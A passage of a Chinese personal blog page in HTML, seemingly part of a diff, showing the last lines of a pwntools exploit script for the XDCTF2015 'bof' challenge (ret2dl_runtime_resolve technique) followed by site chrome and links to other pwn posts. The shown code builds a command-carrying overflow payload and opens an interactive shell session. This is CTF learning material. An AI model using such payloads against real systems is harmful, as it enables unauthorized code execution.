class="line">payload += cmd + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span> * (<span class="number">100</span> - <span class="built_in">len</span>(payload))</span><br><span class="line"><span class="comment">#payload += &quot;/bin/sh\x00\x00&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:1193161901@qq.com">ZYen</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2021/10/05/ret2dl-runtime-resovle/">http://example.com/2021/10/05/ret2dl-runtime-resovle/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">欢迎来到ZYen的小世界！</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2021/10/05/%E4%BB%8EMIPS%E7%9A%84%E5%8F%91%E5%B1%95%E5%8F%B2%E5%BC%80%E5%A7%8B%E5%AD%A6MIPS/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">从MIPS的发展史开始学MIPS</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://img-blog.csdnimg.cn/59ff1b82a08c4567938e7b522a9607a8.jpg?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAWlllbjEyMTM4,size_20,color_FFFFFF,t_70,g_se,x_16" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">ZYen</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">13</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ret2dl-runtime-resovle"><span class="toc-number">1.</span> <span class="toc-text">ret2dl_runtime_resovle</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#XDCTF2015-bof"><span class="toc-number">1.0.0.1.</span> <span class="toc-text">XDCTF2015_bof</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/10/05/ret2dl-runtime-resovle/" title="ret2dl_runtime_resovle"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ret2dl_runtime_resovle"/></a><div class="content"><a class="title" href="/2021/10/05/ret2dl-runtime-resovle/" title="ret2dl_runtime_resovle">ret2dl_runtime_resovle</a><time datetime="2021-10-05T08:40:22.000Z" title="发表于 2021-10-05 16:40:22">2021-10-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/10/05/%E4%BB%8EMIPS%E7%9A%84%E5%8F%91%E5%B1%95%E5%8F%B2%E5%BC%80%E5%A7%8B%E5%AD%A6MIPS/" title="从MIPS的发展史开始学MIPS"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="从MIPS的发展史开始学MIPS"/></a><div class="content"><a class="title" href="/2021/10/05/%E4%BB%8EMIPS%E7%9A%84%E5%8F%91%E5%B1%95%E5%8F%B2%E5%BC%80%E5%A7%8B%E5%AD%A6MIPS/" title="从MIPS的发展史开始学MIPS">从MIPS的发展史开始学MIPS</a><time datetime="2021-10-05T08:38:45.000Z" title="发表于 2021-10-05 16:38:45">2021-10-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/10/05/%E4%BB%8EARM%E7%9A%84%E5%8F%91%E5%B1%95%E5%8F%B2%E5%BC%80%E5%A7%8B%E5%AD%A6ARM/" title="从ARM的发展史开始学ARM"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="从ARM的发展史开始学ARM"/></a><div class="content"><a class="title" href="/2021/10/05/%E4%BB%8EARM%E7%9A%84%E5%8F%91%E5%B1%95%E5%8F%B2%E5%BC%80%E5%A7%8B%E5%AD%A6ARM/" title="从ARM的发展史开始学ARM">从ARM的发展史开始学ARM</a><time datetime="2021-10-05T08:34:55.000Z" title="发表于 2021-10-05 16:34:55">2021-10-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/10/05/unsafe-unlink/" title="unsafe unlink"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="unsafe unlink"/></a><div class="content"><a class="title" href="/2021/10/05/unsafe-unlink/" title="unsafe unlink">unsafe unlink</a><time datetime="2021-10-05T08:30:52.000Z" title="发表于 2021-10-05 16:30:52">2021-10-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/" title="MIPS PWN入门"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="MIPS PWN入门"/></a><div class="content"><a class="title" href="/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/" title="MIPS PWN入门">MIPS PWN入门</a><time datetime="2021-10-05T08:19:01.000Z" title="发表于 2021-10-05 16:19:01">2021-10-05</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By ZYen</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
